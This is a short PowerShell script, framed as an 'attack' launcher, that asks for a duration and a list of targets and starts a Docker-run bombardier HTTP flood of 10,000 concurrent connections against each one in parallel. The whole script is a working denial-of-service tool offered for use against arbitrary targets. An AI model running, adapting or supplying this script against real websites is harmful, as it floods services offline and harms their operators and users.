$Duration = Read-Host -Prompt 'Input duration of the attack (in seconds)';
$NumberOfTargets = Read-Host -Prompt 'Input number of targets';

$Command = "docker run -ti --rm alpine/bombardier -c 10000 -d " + $Duration + "s -l ";

for ($num = 0 ; $num -lt $NumberOfTargets ; $num++){
	$NewTarget = Read-Host -Prompt "Target $($num + 1)";
	Start-Process powershell ($Command + $NewTarget.replace(' ', ''));
}
